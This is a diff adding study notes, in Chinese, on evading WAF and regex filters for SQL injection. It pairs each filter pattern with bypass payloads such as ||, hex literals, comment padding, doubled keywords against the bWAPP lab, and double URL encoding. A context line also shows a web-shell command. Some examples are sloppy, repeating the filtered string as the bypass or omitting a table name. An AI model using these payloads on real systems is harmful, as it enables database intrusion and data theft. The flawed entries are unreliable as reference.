@@ -2193,13 +2193,219 @@ curl -d "hacker=echo getcwd();" http://127.0.0.1/images/shell.php
 
 
 
-#### SQL 注入绕过 
+#### || 和 && 过滤绕过 
+
+- 过滤代码
+  - `preg_match('/(and|or)/i', $id)`
+- 过滤情况
+  - `1 or 1 = 1`
+  - `1 and 1 = 1`
+- 绕过情况
+  - `1 || 1 = 1`
+  - `1 && 1 =1`
+- SQL 测试
+  - show databases;
+  - use testhacker;
+  - select * from test;
+  - select * from test where id=1;
+  - select * from test where id=1 and name='test1';
+  - select * from test where id=1 && name='test1';
+  - select * from test where id=1 or name='test3';
+  - select * from test where id=1 || name='test3';
 
 
 
+#### union 过滤绕过 
+
+- 过滤代码
+  - `preg_match('/(and|or|union)/i', $id)`
+- 过滤情况
+  - `union select user, password from users`
+- 绕过情况
+  - `|| (select user from users where user_id = 1) = 'admin'`
+- 思考🤔
+  - 怎么知道 users表/ user列/admin 字段呢？全靠猜么？ 
+- SQL 测试
+  - select * from test;
+  - select * from test where id=1;
+  - select * from test where id=1 || (select count(*) from test)>0;
+    - 首先分清 || 符号的作用范围，是 where 之后的内容；
+    - test 表名的判断？首先确实可以猜，尤其是 users 这种常用表；
+    - 如果猜不到？通过 information_schema.tables 及 substr 来联合判断；
+    - 回到上一页的问题，列名及字段内容也是同理。 
 
 
 
+#### where 过滤绕过
+
+- 过滤代码
+  - `preg_match('/(and|or|union|where)/i', $id)`
+- 过滤情况
+  - `|| (select user from users where user_id = 1) = 'admin'`
+- 绕过情况 
+  - `|| (select user from users limit 1,1) = 'admin'`
+- SQL 测试
+  - select * from test;
+  - select * from test where id=2;
+  - select * from test limit 1,1;
+  - select * from test limit 1,2;
+
+
+
+#### limit 过滤绕过
+
+- 过滤代码
+  - `preg_match('/(and|or|union|where|limit)/i', $id)`
+- 过滤情况
+  - `|| (select user from users limit 1,1) = 'admin'`
+- 绕过情况 
+  - `|| (select min(user) from group by user_id having user_id = 1) = 'admin'`
+- SQL 测试
+  - select * from test;
+  - select name from test where id=1 limit 1;
+  - select id,min(name) from test group by id having id =1;
+    - 为什么要使用 min(name)，而不直接使用 name 呢？
+    - 基于 group by 和 having 的使用，会创建一个虚拟表，
+
+
+
+#### group by 过滤绕过
+
+- 过滤代码
+  - `preg_match('/(and|or|union|where|limit|group by)/i', $id)`
+- 过滤情况
+  - `|| (select min(user) from group by user_id having user_id = 1) = 'admin'`
+- 绕过情况 
+  - `|| select substr((select group_concat(name) name from test), 1, 1) = 't'`
+- SQL 测试
+  - select group_concat(name) name from test;
+  - select group_concat(name) name_test from test;
+  - select substr((select group_concat(name) name_test from test), 1, 1) = 't';
+
+
+
+#### select 及单引号过滤绕过
+
+- 过滤代码
+  - `preg_match('/(and|or|union|where|limit|group by|select|\'|)/i', $id)`
+- 过滤情况
+  - `|| select substr((select group_concat(name) name from test), 1, 1) = 't'`
+- 绕过情况 
+  - `|| substr(name ,1 , 1) = 0x74`
+  - `|| substr(name ,1 , 1) = unhex(74)`
+- SQL 测试
+  - select * from test where id=1 limit 1;
+  - select * from test where id=1 || substr(name, 1,1)='t';
+  - select * from test where id=1 || substr(name, 1,1)=0x74;
+
+
+
+#### hex、unhex、及 substr 过滤绕过
+
+- binary  函数
+  - binary  函数 是可以 直接进行比较的
+- 过滤代码
+  - `preg_match('/(and|or|union|where|limit|group by|select|\'|hex|unhex|substr)/i', $id)`
+- 过滤情况
+  - `|| substr(name ,1 , 1) = unhex(74)`
+- 绕过情况 
+  - `|| binary(name) = 0x74657374`
+- SQL 测试
+  - select * from test;
+  - select * from test where id=1 && binary(name)=0x74;
+    - 查询结果为 空
+  - select * from test where id=1 && binary(name)>0x74;
+    - 查询成功
+
+
+
+#### 空格过滤绕过 
+
+- 过滤代码
+  - `preg_match('/(and|or|union|where|limit|group by|select|\'|hex|unhex|substr|\s)/i', $id)`
+- 过滤情况
+  - `|| binary(name) = 0x74657374`
+- 绕过情况 
+  - `|| binary(name) = 0x74657374`
+- SQL 测试
+  - select * from test;
+  - select name from test where id=1;
+  - `select/**/name/**/from/**/test/**/where/**/id=1;`
+  - 除了注释符号，也可以通过 URL 编码绕过 WAF。
+  - 这部分我们会在前端安全部分讲解 
+
+
+
+#### = 过滤绕过 
+
+- 过滤代码
+  - `preg_match('/(and|or|union|where|limit|group by|select|\'|hex|unhex|substr|\s|=)/i', $id)`
+- 过滤情况
+  - `1/**/||/**/binary(name)/**/=/**/0x74657374`
+- 绕过情况 
+  - `1/**/||/**/binary(name)/**/=/**/0x74657374`
+- SQL 测试
+  - select * from test where name='test1';
+  - select * from test where name like 'test1';
+
+
+
+#### 双写绕过 
+
+- 安装，注册，并登录 bWAPP 靶机
+- 选择bug类型：Choose your bug: SQL Injection (GET/Select)
+- 选择bug等级：Set your security level：medium
+- 注入测试
+  - http://127.0.0.1/sqli_2.php?movie=1 union select 1,2,3,4,5,6,7 &action=go
+    - 此时的 union 字段会被 程序逻辑替换成 空字符串
+  - http://127.0.0.1/sqli_2.php?movie=1 uniunionon select 1,2,3,4,5,6,7 &action=go
+    - 在 union 内写一个union 就可以实现不被替换掉
+  - http://127.0.0.1/sqli_2.php?movie=13 uniunionon select 1,2,3,4,5,6,7 &action=go
+    - 输入一个不存在的电影名字，就可以看到页面的展示逻辑
+
+
+
+#### 双重编码绕过
+
+- 过滤代码
+  - WAF：urldecode(param)->过滤 
+- 过滤情况
+  - `1/**/||/**/binary(name)/**/=/**/0x74657374`
+- 绕过情况
+  - `1%252f ...`
+- 说明 
+  - `%252f /   %252a *  `
+
+
+
+#### 转义函数
+
+- 转义函数也不是万能的
+
+- 简单绕过转义函数 
+
+  - ```php
+    $Id = mysql_real_escape_string("1 OR 1=1");
+    
+    $Sql = "SELECT * FROM table WHERE id = $Id";
+    
+    $Sql = "SELECT * FROM table WHERE id = 1 OR 1=1";
+    ```
+
+  - 更换了 SQL 的执行逻辑
+
+
+
+#### 总结
+
+简单来说，SQL注入的混淆之绕过 WAF  分为几种方式：
+1. SQL 语句的同义变形体；
+2. 利用 WAF 规则设定的缺陷（如双写） ；
+3. 利用技术链中间环节绕过（如编码）。 
+
+
+
+### sqli-labs 
 
 
 
